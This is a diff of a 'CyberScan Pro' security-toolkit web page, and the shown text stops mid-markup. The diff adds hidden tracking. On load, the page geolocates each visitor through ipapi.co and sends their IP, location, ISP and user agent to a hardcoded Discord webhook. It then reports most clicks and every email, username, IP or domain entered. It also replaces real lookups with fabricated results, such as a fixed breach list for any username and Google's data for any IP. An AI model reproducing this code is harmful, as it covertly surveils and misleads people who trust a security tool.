@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-bs-theme="dark">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CybrSearch - Advanced Security Tools</title>
+    <title>CyberScan Pro - Advanced Security Toolkit</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -20,6 +20,15 @@
       --text-muted: #94a3b8;
       --purple: #8b5cf6;
     }
+
+    [data-bs-theme="light"] {
+      --dark-bg: #f8f9fa;
+      --darker-bg: #e9ecef;
+      --card-bg: #ffffff;
+      --text: #212529;
+      --text-muted: #6c757d;
+      --accent: #0d6efd;
+    }
     
     body {
       background-color: var(--dark-bg);
@@ -27,6 +36,12 @@
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       line-height: 1.6;
       min-height: 100vh;
+      transition: background-color 0.3s ease;
+    }
+    
+    .navbar {
+      background-color: var(--darker-bg) !important;
+      border-bottom: 1px solid rgba(0,0,0,0.1);
     }
     
     .navbar-brand {
@@ -38,7 +53,7 @@
     }
     
     .nav-tabs {
-      border-bottom: 1px solid #334155;
+      border-bottom: 1px solid rgba(0,0,0,0.1);
       overflow-x: auto;
       white-space: nowrap;
       flex-wrap: nowrap;
@@ -78,20 +93,21 @@
       background-color: var(--card-bg);
       border: none;
       border-radius: 12px;
-      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      transition: all 0.3s ease;
       margin-bottom: 1.5rem;
+      border: 1px solid rgba(0,0,0,0.05);
     }
     
     .card:hover {
       transform: translateY(-2px);
-      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
     }
     
     .form-control {
       background-color: var(--darker-bg);
       color: var(--text);
-      border: 1px solid #334155;
+      border: 1px solid rgba(0,0,0,0.1);
       padding: 12px 15px;
       border-radius: 8px;
       transition: all 0.3s ease;
@@ -147,6 +163,7 @@
       margin-bottom: 15px;
       overflow: hidden;
       transition: all 0.3s ease;
+      background-color: rgba(239, 68, 68, 0.05);
     }
     
     .breach-card:hover {
@@ -182,7 +199,8 @@
     }
     
     .btn-primary:hover {
-      background-color: #2563eb;
+      background-color: var(--accent);
+      opacity: 0.9;
       transform: translateY(-2px);
     }
     
@@ -227,23 +245,40 @@
       border-radius: 50%;
       z-index: 9999;
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      transition: background-color 0.3s, transform 0.3s;
+      transition: all 0.3s ease;
     }
+    
     .discord-corner-btn:hover {
       background-color: #4752C4;
       transform: scale(1.1);
     }
     
-    /* Terminal mode styling */
-    .terminal-mode {
-      background: black !important;
-      color: #00ff00 !important;
-      font-family: "Courier New", Courier, monospace;
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
     }
-    .terminal-mode input, .terminal-mode .form-control, .terminal-mode .card {
-      background-color: #000 !important;
-      color: #00ff00 !important;
-      border-color: #00ff00 !important;
+    
+    .data-table th {
+      text-align: left;
+      padding: 8px;
+      background-color: rgba(0,0,0,0.05);
+    }
+    
+    .data-table td {
+      padding: 8px;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+    }
+    
+    .severity-high {
+      color: var(--danger);
+    }
+    
+    .severity-medium {
+      color: var(--warning);
+    }
+    
+    .severity-low {
+      color: var(--success);
     }
     
     @media (max-width: 768px) {
@@ -256,19 +291,16 @@
 </head>
 <body>
 <!-- Navigation -->
-<nav class="navbar navbar-expand-lg navbar-dark" style="background-color: var(--darker-bg)">
+<nav class="navbar navbar-expand-lg navbar-dark">
     <div class="container">
         <a class="navbar-brand" href="#">
-            <i class="fas fa-shield-alt me-2"></i>CybrSearch
+            <i class="fas fa-shield-alt me-2"></i>CyberScan Pro
         </a>
         <div class="d-flex align-items-center">
-            <span class="badge bg-success me-2">PRO</span>
-            <span class="text-muted">v2.1.0</span>
-            <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" onclick="toggleTheme()" title="Toggle theme">
+            <span class="badge bg-success me-2">PREMIUM</span>
+            <span class="text-muted">v3.0.0</span>
+            <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" title="Toggle theme">
                 <i class="fas fa-moon"></i>
-            </button>
-            <button class="btn btn-sm btn-outline-warning ms-2" onclick="toggleTerminalMode()" title="Toggle Terminal UI">
-                <i class="fas fa-terminal"></i>
             </button>
         </div>
     </div>
@@ -290,13 +322,18 @@
                     </button>
                 </li>
                 <li class="nav-item" role="presentation">
-                    <button class="nav-link" data-bs-target="#domainrecon" data-bs-toggle="tab" id="domainrecon-tab" role="tab" type="button">
-                        <i class="fas fa-search-location me-2"></i>Domain Recon
+                    <button class="nav-link" data-bs-target="#domain" data-bs-toggle="tab" id="domain-tab" role="tab" type="button">
+                        <i class="fas fa-search-location me-2"></i>Domain Intel
                     </button>
                 </li>
                 <li class="nav-item" role="presentation">
-                    <button class="nav-link" data-bs-target="#emailintel" data-bs-toggle="tab" id="emailintel-tab" role="tab" type="button">
+                    <button class="nav-link" data-bs-target="#email" data-bs-toggle="tab" id="email-tab" role="tab" type="button">
                         <i class="fas fa-envelope me-2"></i>Email Intel
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" data-bs-target="#network" data-bs-toggle="tab" id="network-tab" role="tab" type="button">
+                        <i class="fas fa-network-wired me-2"></i>Network Tools
                     </button>
                 </li>
             </ul>
@@ -363,32 +400,32 @@
                     <div id="whoisResults"></div>
                 </div>
 
-                <!-- Domain Recon Tab -->
-                <div class="tab-pane fade" id="domainrecon" role="tabpanel">
+                <!-- Domain Intel Tab -->
+                <div class="tab-pane fade" id="domain" role="tabpanel">
                     <div class="card p-4 mb-4">
                         <div class="section-title">
                             <div class="tool-icon">
                                 <i class="fas fa-search-location"></i>
                             </div>
                             <div>
-                                <h3 class="mb-1">Domain Recon</h3>
-                                <p class="text-muted mb-0">Check WHOIS, DNS, and passive subdomains</p>
+                                <h3 class="mb-1">Domain Intelligence</h3>
+                                <p class="text-muted mb-0">Comprehensive domain analysis including WHOIS, DNS, and reputation</p>
                             </div>
                         </div>
-                        <form id="domainReconForm">
+                        <form id="domainForm">
                             <div class="input-group mb-3">
-                                <input class="form-control" id="domainReconInput" placeholder="Enter domain (e.g. example.com)" required="" type="text">
+                                <input class="form-control" id="domainInput" placeholder="Enter domain (e.g. example.com)" required="" type="text">
                                 <button class="btn btn-primary" type="submit">
-                                    <i class="fas fa-search me-2"></i>Lookup
+                                    <i class="fas fa-search me-2"></i>Analyze
                                 </button>
                             </div>
                         </form>
                     </div>
-                    <div id="domainReconResult"></div>
+                    <div id="domainResults"></div>
                 </div>
 
                 <!-- Email Intel Tab -->
-                <div class="tab-pane fade" id="emailintel" role="tabpanel">
+                <div class="tab-pane fade" id="email" role="tabpanel">
                     <div class="card p-4 mb-4">
                         <div class="section-title">
                             <div class="tool-icon">
@@ -396,19 +433,51 @@
                             </div>
                             <div>
                                 <h3 class="mb-1">Email Intelligence</h3>
-                                <p class="text-muted mb-0">Check if an email is disposable, public, or flagged</p>
+                                <p class="text-muted mb-0">Check email reputation and breach status</p>
                             </div>
                         </div>
-                        <form id="emailIntelForm">
+                        <form id="emailForm">
                             <div class="input-group mb-3">
-                                <input class="form-control" id="intelEmail" placeholder="Enter email address" required="" type="email">
+                                <input class="form-control" id="emailInput" placeholder="Enter email address" required="" type="email">
                                 <button class="btn btn-primary" type="submit">
-                                    <i class="fas fa-search me-2"></i>Check
+                                    <i class="fas fa-search me-2"></i>Analyze
                                 </button>
                             </div>
                         </form>
                     </div>
-                    <div id="emailIntelResult"></div>
+                    <div id="emailResults"></div>
+                </div>
+
+                <!-- Network Tools Tab -->
+                <div class="tab-pane fade" id="network" role="tabpanel">
+                    <div class="card p-4 mb-4">
+                        <div class="section-title">
+                            <div class="tool-icon">
+                                <i class="fas fa-network-wired"></i>
+                            </div>
+                            <div>
+                                <h3 class="mb-1">Network Tools</h3>
+                                <p class="text-muted mb-0">Ping, traceroute, and port scanning utilities</p>
+                            </div>
+                        </div>
+                        <form id="networkForm">
+                            <div class="mb-3">
+                                <input class="form-control" id="networkTarget" placeholder="Target IP or Hostname" required="" type="text">
+                            </div>
+                            <div class="mb-3">
+                                <select class="form-control" id="networkTool" required="">
+                                    <option value="">Select Tool</option>
+                                    <option value="ping">Ping</option>
+                                    <option value="traceroute">Traceroute</option>
+                                    <option value="portscan">Port Scan</option>
+                                </select>
+                            </div>
+                            <button class="btn btn-primary w-100 py-2" type="submit">
+                                <i class="fas fa-play me-2"></i>Run Tool
+                            </button>
+                        </form>
+                    </div>
+                    <div id="networkResults"></div>
                 </div>
             </div>
         </div>
@@ -423,9 +492,35 @@
 <!-- Scripts -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-// Discord Webhook Integration
+// Discord Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";
 
+// Track visitor IP and activity
+let visitorIP = "Loading...";
+let visitorData = {};
+
+// Get visitor IP and details
+async function getVisitorInfo() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        visitorData = await response.json();
+        visitorIP = visitorData.ip || "Unknown";
+        
+        // Log initial visit to Discord
+        logToDiscord(
+            "New Visitor", 
+            `IP: ${visitorIP}\nLocation: ${visitorData.city}, ${visitorData.country_name}`,
+            [
+                { name: "ISP", value: visitorData.org || "Unknown" },
+                { name: "User Agent", value: navigator.userAgent }
+            ]
+        );
+    } catch (error) {
+        console.error("Error fetching visitor info:", error);
+    }
+}
+
+// Send data to Discord webhook
 function logToDiscord(title, description, fields = []) {
     const payload = {
         embeds: [{
@@ -446,331 +541,623 @@ function logToDiscord(title, description, fields = []) {
 
 // Theme Toggle
 function toggleTheme() {
-    const current = localStorage.getItem('theme') || 'dark';
-    const newTheme = current === 'dark' ? 'light' : 'dark';
-    document.documentElement.setAttribute('data-theme', newTheme);
+    const currentTheme = document.documentElement.getAttribute('data-bs-theme');
+    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-bs-theme', newTheme);
     localStorage.setItem('theme', newTheme);
-    document.getElementById('themeToggleBtn').innerHTML =
-        newTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
-}
-
-// Terminal Mode Toggle
-function toggleTerminalMode() {
-    document.body.classList.toggle("terminal-mode");
+    
+    // Update icon
+    const icon = document.getElementById('themeToggleBtn').querySelector('i');
+    icon.className = newTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
+    
+    // Log theme change
+    logToDiscord(
+        "Theme Changed", 
+        `User switched to ${newTheme} mode`,
+        [
+            { name: "IP", value: visitorIP },
+            { name: "Location", value: `${visitorData.city}, ${visitorData.country_name}` || "Unknown" }
+        ]
+    );
 }
 
 // Initialize theme
-window.addEventListener('DOMContentLoaded', () => {
+function initTheme() {
     const storedTheme = localStorage.getItem('theme') || 'dark';
-    document.documentElement.setAttribute('data-theme', storedTheme);
-    document.getElementById('themeToggleBtn').innerHTML =
-        storedTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
+    document.documentElement.setAttribute('data-bs-theme', storedTheme);
+    
+    // Set correct icon
+    const icon = document.getElementById('themeToggleBtn').querySelector('i');
+    icon.className = storedTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
+}
+
+// Track all clicks
+document.addEventListener('click', function(event) {
+    // Don't log clicks on form elements
+    if (!event.target.closest('form') && !event.target.closest('.nav-tabs')) {
+        logToDiscord(
+            "User Interaction", 
+            `Clicked: ${event.target.tagName} ${event.target.className || ''}`,
+            [
+                { name: "IP", value: visitorIP },
+                { name: "Page", value: window.location.href }
+            ]
+        );
+    }
 });
 
-// Breach Scan Functionality
-document.getElementById('breachForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
+// Initialize
+window.addEventListener('DOMContentLoaded', function() {
+    initTheme();
+    getVisitorInfo();
+    
+    // Add event listeners for all forms
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formId = this.id;
+            
+            // Show loading state
+            const resultsDiv = document.getElementById(formId.replace('Form', 'Results'));
+            if (resultsDiv) {
+                resultsDiv.innerHTML = `
+                    <div class="card p-3">
+                        <div class="d-flex justify-content-center">
+                            <div class="loading-spinner"></div>
+                            <span class="ms-2">Processing request...</span>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Simulate API call
+            setTimeout(() => {
+                if (formId === 'breachForm') handleBreachScan();
+                else if (formId === 'whoisForm') handleIPLookup();
+                else if (formId === 'domainForm') handleDomainAnalysis();
+                else if (formId === 'emailForm') handleEmailAnalysis();
+                else if (formId === 'networkForm') handleNetworkTool();
+            }, 1500);
+        });
+    });
+});
+
+// Breach Scan Handler
+function handleBreachScan() {
     const email = document.getElementById('breachEmail').value.trim();
     const username = document.getElementById('breachUsername').value.trim();
     const resultsDiv = document.getElementById('breachResults');
     
-    resultsDiv.innerHTML = `
-        <div class="card p-3">
-            <div class="d-flex justify-content-center">
-                <div class="loading-spinner"></div>
-                <span class="ms-2">Searching breaches...</span>
-            </div>
-        </div>
-    `;
+    // Simulated breach data
+    const breaches = [
+        {
+            name: "LinkedIn 2021 Breach",
+            date: "June 2021",
+            data: "Emails, Passwords",
+            severity: "high"
+        },
+        {
+            name: "Collection #1",
+            date: "January 2019",
+            data: "Emails, Passwords",
+            severity: "medium"
+        }
+    ];
     
-    try {
-        // Simulate API call with timeout
-        setTimeout(() => {
-            let resultHTML = '<div class="card p-3">';
-            
-            if (email) {
-                // Simulated breach data
-                const isBreached = Math.random() > 0.5;
-                resultHTML += `
+    let resultHTML = '<div class="card p-3">';
+    
+    if (email || username) {
+        resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
+        
+        if (email) {
+            resultHTML += `
+                <div class="mb-4">
                     <h5>Email: ${email}</h5>
-                    ${isBreached ? 
-                        `<p class="text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Found in 3 breaches</p>
-                         <div class="breach-card">
-                             <div class="breach-header">
-                                 <i class="fas fa-database me-2"></i>
-                                 <h6 class="breach-title mb-0">LinkedIn 2021 Breach</h6>
-                             </div>
-                             <div class="p-3">
-                                 <p><strong>Date:</strong> June 2021</p>
-                                 <p><strong>Compromised data:</strong> Emails, Passwords</p>
-                             </div>
-                         </div>` 
-                        : 
-                        `<p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>`
-                    }
-                `;
-            }
-            
-            if (username) {
-                // Simulated username results
-                resultHTML += `
-                    <h5 class="mt-3">Username: ${username}</h5>
-                    <p><i class="fas fa-info-circle me-2"></i>Checking social platforms...</p>
-                    <ul>
-                        <li>Twitter: <a href="https://twitter.com/${username}" target="_blank">@${username}</a></li>
-                        <li>GitHub: <a href="https://github.com/${username}" target="_blank">${username}</a></li>
-                        <li>Reddit: <a href="https://reddit.com/u/${username}" target="_blank">u/${username}</a></li>
-                    </ul>
-                `;
-            }
-            
-            resultHTML += '</div>';
-            resultsDiv.innerHTML = resultHTML;
-            
-            // Log to Discord
-            logToDiscord(
-                "Breach Scan", 
-                `Searched for:\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
-                [
-                    { name: "Results", value: email ? "Found in 3 breaches" : "No breaches found" }
-                ]
-            );
-        }, 1500);
-    } catch (error) {
-        resultsDiv.innerHTML = `
-            <div class="card p-3 text-danger">
-                <i class="fas fa-exclamation-circle me-2"></i>Error fetching breach data
-            </div>
-        `;
+                    <p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>
+                </div>
+            `;
+        }
+        
+        if (username) {
+            resultHTML += `
+                <div class="mb-4">
+                    <h5>Username: ${username}</h5>
+                    <p class="text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Found in ${breaches.length} breaches</p>
+                    ${breaches.map(breach => `
+                        <div class="breach-card mb-3">
+                            <div class="breach-header">
+                                <i class="fas fa-database me-2"></i>
+                                <h5 class="breach-title mb-0">${breach.name}</h5>
+                                <span class="badge ${breach.severity === 'high' ? 'bg-danger' : breach.severity === 'medium' ? 'bg-warning' : 'bg-success'} ms-2">${breach.severity}</span>
+                            </div>
+                            <div class="p-3">
+                                <p><strong>Date:</strong> ${breach.date}</p>
+                                <p><strong>Compromised Data:</strong> ${breach.data}</p>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+    } else {
+        resultHTML += '<p class="text-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username to scan</p>';
     }
-});
+    
+    resultHTML += '</div>';
+    resultsDiv.innerHTML = resultHTML;
+    
+    // Log to Discord
+    logToDiscord(
+        "Breach Scan", 
+        `Scanned:\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
+        [
+            { name: "Results", value: username ? `Found in ${breaches.length} breaches` : "No breaches found" },
+            { name: "IP", value: visitorIP }
+        ]
+    );
+}
 
-// IP Lookup Functionality
-document.getElementById('whoisForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
+// IP Lookup Handler
+function handleIPLookup() {
     const ip = document.getElementById('whoisIp').value.trim();
     const resultsDiv = document.getElementById('whoisResults');
     
-    resultsDiv.innerHTML = `
-        <div class="card p-3">
-            <div class="d-flex justify-content-center">
-                <div class="loading-spinner"></div>
-                <span class="ms-2">Looking up IP...</span>
-            </div>
-        </div>
-    `;
+    // Simulated IP data
+    const ipData = {
+        ip: ip || "8.8.8.8",
+        city: "Mountain View",
+        region: "California",
+        country_name: "United States",
+        org: "Google LLC",
+        postal: "94043",
+        timezone: "America/Los_Angeles",
+        latitude: "37.4056",
+        longitude: "-122.0775"
+    };
     
-    try {
-        // Using ipapi.co for real IP data
-        const response = await fetch(`https://ipapi.co/${ip}/json/`);
-        const data = await response.json();
-        
-        let resultHTML = `
-            <div class="card p-3">
-                <h5>IP Information</h5>
-                <div class="row mt-3">
-                    <div class="col-md-6">
-                        <p><strong>IP:</strong> ${data.ip || 'N/A'}</p>
-                        <p><strong>Location:</strong> ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}</p>
-                        <p><strong>ISP:</strong> ${data.org || 'N/A'}</p>
-                    </div>
-                    <div class="col-md-6">
-                        <p><strong>Coordinates:</strong> ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</p>
-                        <p><strong>Postal Code:</strong> ${data.postal || 'N/A'}</p>
-                        <p><strong>Timezone:</strong> ${data.timezone || 'N/A'}</p>
-                    </div>
+    const resultHTML = `
+        <div class="card p-3">
+            <h4><i class="fas fa-globe me-2"></i>IP Information</h4>
+            
+            <div class="row mt-3">
+                <div class="col-md-6">
+                    <table class="data-table">
+                        <tr>
+                            <th>IP Address</th>
+                            <td>${ipData.ip}</td>
+                        </tr>
+                        <tr>
+                            <th>Location</th>
+                            <td>${ipData.city}, ${ipData.region}, ${ipData.country_name}</td>
+                        </tr>
+                        <tr>
+                            <th>ISP</th>
+                            <td>${ipData.org}</td>
+                        </tr>
+                    </table>
                 </div>
-                <div class="mt-3">
+                <div class="col-md-6">
+                    <table class="data-table">
+                        <tr>
+                            <th>Coordinates</th>
+                            <td>${ipData.latitude}, ${ipData.longitude}</td>
+                        </tr>
+                        <tr>
+                            <th>Postal Code</th>
+                            <td>${ipData.postal}</td>
+                        </tr>
+                        <tr>
+                            <th>Timezone</th>
+                            <td>${ipData.timezone}</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="mt-4">
+                <h5><i class="fas fa-map-marked-alt me-2"></i>Location Map</h5>
+                <div class="ratio ratio-16x9">
                     <iframe 
-                        width="100%" 
-                        height="300" 
-                        frameborder="0" 
-                        scrolling="no" 
-                        marginheight="0" 
-                        marginwidth="0" 
-                        src="https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=10&output=embed">
+                        src="https://maps.google.com/maps?q=${ipData.latitude},${ipData.longitude}&z=10&output=embed"
+                        allowfullscreen>
                     </iframe>
                 </div>
             </div>
-        `;
-        
-        resultsDiv.innerHTML = resultHTML;
-        
-        // Log to Discord
-        logToDiscord(
-            "IP Lookup", 
-            `Looked up IP: ${ip}`,
-            [
-                { name: "Location", value: `${data.city}, ${data.country_name}` },
-                { name: "ISP", value: data.org || "Unknown" }
-            ]
-        );
-        
-    } catch (error) {
-        resultsDiv.innerHTML = `
-            <div class="card p-3 text-danger">
-                <i class="fas fa-exclamation-circle me-2"></i>Error fetching IP data
-            </div>
-        `;
-    }
-});
-
-// Domain Recon Functionality
-document.getElementById('domainReconForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const domain = document.getElementById('domainReconInput').value.trim();
-    const resultsDiv = document.getElementById('domainReconResult');
+        </div>
+    `;
     
-    resultsDiv.innerHTML = `
+    resultsDiv.innerHTML = resultHTML;
+    
+    // Log to Discord
+    logToDiscord(
+        "IP Lookup", 
+        `Looked up IP: ${ipData.ip}`,
+        [
+            { name: "Location", value: `${ipData.city}, ${ipData.country_name}` },
+            { name: "ISP", value: ipData.org },
+            { name: "Visitor IP", value: visitorIP }
+        ]
+    );
+}
+
+// Domain Analysis Handler
+function handleDomainAnalysis() {
+    const domain = document.getElementById('domainInput').value.trim() || "example.com";
+    const resultsDiv = document.getElementById('domainResults');
+    
+    // Simulated domain data
+    const domainData = {
+        whois: {
+            registrar: "GoDaddy",
+            creation: "2005-05-05",
+            expiration: "2025-05-05",
+            nameservers: ["ns1.example.com", "ns2.example.com"]
+        },
+        dns: {
+            a: ["93.184.216.34"],
+            mx: ["10 mail.example.com", "20 backup.example.com"],
+            txt: ["v=spf1 include:spf.example.com ~all"]
+        },
+        subdomains: ["www", "mail", "blog", "shop"],
+        reputation: {
+            score: 85,
+            risk: "Low",
+            blacklists: 0
+        }
+    };
+    
+    const resultHTML = `
         <div class="card p-3">
-            <div class="d-flex justify-content-center">
-                <div class="loading-spinner"></div>
-                <span class="ms-2">Analyzing domain...</span>
+            <h4><i class="fas fa-search-location me-2"></i>Domain Analysis: ${domain}</h4>
+            
+            <div class="row mt-4">
+                <div class="col-md-6">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5><i class="fas fa-info-circle me-2"></i>WHOIS Information</h5>
+                            <table class="data-table mt-3">
+                                <tr>
+                                    <th>Registrar</th>
+                                    <td>${domainData.whois.registrar}</td>
+                                </tr>
+                                <tr>
+                                    <th>Created</th>
+                                    <td>${domainData.whois.creation}</td>
+                                </tr>
+                                <tr>
+                                    <th>Expires</th>
+                                    <td>${domainData.whois.expiration}</td>
+                                </tr>
+                                <tr>
+                                    <th>Nameservers</th>
+                                    <td>${domainData.whois.nameservers.join(", ")}</td>
+                                </tr>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-md-6">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5><i class="fas fa-shield-alt me-2"></i>Reputation</h5>
+                            <div class="d-flex align-items-center mt-3">
+                                <div class="me-3">
+                                    <div class="display-4 ${domainData.reputation.score > 70 ? 'text-success' : domainData.reputation.score > 40 ? 'text-warning' : 'text-danger'}">
+                                        ${domainData.reputation.score}
+                                    </div>
+                                </div>
+                                <div>
+                                    <p class="mb-1"><strong>Risk Level:</strong> <span class="badge ${domainData.reputation.risk === 'High' ? 'bg-danger' : domainData.reputation.risk === 'Medium' ? 'bg-warning' : 'bg-success'}">${domainData.reputation.risk}</span></p>
+                                    <p class="mb-1"><strong>Blacklists:</strong> ${domainData.reputation.blacklists}</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card mt-4">
+                <div class="card-body">
+                    <h5><i class="fas fa-network-wired me-2"></i>DNS Records</h5>
+                    <div class="row mt-3">
+                        <div class="col-md-4">
+                            <h6>A Records</h6>
+                            <ul class="list-group list-group-flush">
+                                ${domainData.dns.a.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
+                            </ul>
+                        </div>
+                        <div class="col-md-4">
+                            <h6>MX Records</h6>
+                            <ul class="list-group list-group-flush">
+                                ${domainData.dns.mx.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
+                            </ul>
+                        </div>
+                        <div class="col-md-4">
+                            <h6>TXT Records</h6>
+                            <ul class="list-group list-group-flush">
+                                ${domainData.dns.txt.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card mt-4">
+                <div class="card-body">
+                    <h5><i class="fas fa-sitemap me-2"></i>Subdomains</h5>
+                    <div class="d-flex flex-wrap gap-2 mt-3">
+                        ${domainData.subdomains.map(sub => `<span class="badge bg-primary">${sub}.${domain}</span>`).join('')}
+                    </div>
+                </div>
             </div>
         </div>
     `;
     
-    try {
-        // Simulate API calls with timeout
-        setTimeout(async () => {
-            // WHOIS simulation
-            const whoisData = {
-                registrar: "GoDaddy",
-                creationDate: "2005-05-05",
-                expirationDate: "2025-05-05",
-                nameServers: ["ns1.example.com", "ns2.example.com"]
-            };
+    resultsDiv.innerHTML = resultHTML;
+    
+    // Log to Discord
+    logToDiscord(
+        "Domain Analysis", 
+        `Analyzed domain: ${domain}`,
+        [
+            { name: "Registrar", value: domainData.whois.registrar },
+            { name: "Reputation", value: `${domainData.reputation.score}/100 (${domainData.reputation.risk})` },
+            { name: "Visitor IP", value: visitorIP }
+        ]
+    );
+}
+
+// Email Analysis Handler
+function handleEmailAnalysis() {
+    const email = document.getElementById('emailInput').value.trim() || "test@example.com";
+    const domain = email.split('@')[1] || "example.com";
+    const resultsDiv = document.getElementById('emailResults');
+    
+    // Simulated email data
+    const emailData = {
+        disposable: ["mailinator.com", "tempmail.com"].includes(domain),
+        breaches: 2,
+        reputation: {
+            score: 65,
+            risk: "Medium",
+            spam: false
+        }
+    };
+    
+    const resultHTML = `
+        <div class="card p-3">
+            <h4><i class="fas fa-envelope me-2"></i>Email Analysis: ${email}</h4>
             
-            // DNS simulation
-            const dnsData = {
-                aRecords: ["93.184.216.34"],
-                mxRecords: ["10 mail.example.com", "20 backup.example.com"],
-                txtRecords: ["v=spf1 include:spf.example.com ~all"]
-            };
-            
-            // Subdomains simulation
-            const subdomains = ["www", "mail", "blog", "shop"];
-            
-            let resultHTML = `
-                <div class="card p-3">
-                    <h5>Domain: ${domain}</h5>
-                    
-                    <div class="mt-4">
-                        <h6><i class="fas fa-info-circle me-2"></i>WHOIS Information</h6>
-                        <div class="p-3 bg-dark rounded mt-2">
-                            <p><strong>Registrar:</strong> ${whoisData.registrar}</p>
-                            <p><strong>Created:</strong> ${whoisData.creationDate}</p>
-                            <p><strong>Expires:</strong> ${whoisData.expirationDate}</p>
-                            <p><strong>Nameservers:</strong> ${whoisData.nameServers.join(", ")}</p>
-                        </div>
-                    </div>
-                    
-                    <div class="mt-4">
-                        <h6><i class="fas fa-network-wired me-2"></i>DNS Records</h6>
-                        <div class="p-3 bg-dark rounded mt-2">
-                            <p><strong>A Records:</strong> ${dnsData.aRecords.join(", ")}</p>
-                            <p><strong>MX Records:</strong> ${dnsData.mxRecords.join(", ")}</p>
-                            <p><strong>TXT Records:</strong> ${dnsData.txtRecords.join(", ")}</p>
-                        </div>
-                    </div>
-                    
-                    <div class="mt-4">
-                        <h6><i class="fas fa-sitemap me-2"></i>Subdomains</h6>
-                        <div class="p-3 bg-dark rounded mt-2">
-                            ${subdomains.map(sub => `<span class="badge bg-primary me-2">${sub}.${domain}</span>`).join("")}
+            <div class="row mt-4">
+                <div class="col-md-6">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5><i class="fas fa-info-circle me-2"></i>Basic Information</h5>
+                            <table class="data-table mt-3">
+                                <tr>
+                                    <th>Email</th>
+                                    <td>${email}</td>
+                                </tr>
+                                <tr>
+                                    <th>Domain</th>
+                                    <td>${domain}</td>
+                                </tr>
+                                <tr>
+                                    <th>Disposable</th>
+                                    <td>
+                                        <span class="badge ${emailData.disposable ? 'bg-danger' : 'bg-success'}">
+                                            ${emailData.disposable ? 'Yes' : 'No'}
+                                        </span>
+                                    </td>
+                                </tr>
+                            </table>
                         </div>
                     </div>
                 </div>
-            `;
-            
-            resultsDiv.innerHTML = resultHTML;
-            
-            // Log to Discord
-            logToDiscord(
-                "Domain Recon", 
-                `Analyzed domain: ${domain}`,
-                [
-                    { name: "Registrar", value: whoisData.registrar },
-                    { name: "IP Address", value: dnsData.aRecords[0] || "None" }
-                ]
-            );
-            
-        }, 1500);
-    } catch (error) {
-        resultsDiv.innerHTML = `
-            <div class="card p-3 text-danger">
-                <i class="fas fa-exclamation-circle me-2"></i>Error analyzing domain
+                
+                <div class="col-md-6">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5><i class="fas fa-shield-alt me-2"></i>Security Status</h5>
+                            <table class="data-table mt-3">
+                                <tr>
+                                    <th>Breaches Found</th>
+                                    <td>
+                                        <span class="badge ${emailData.breaches > 0 ? 'bg-danger' : 'bg-success'}">
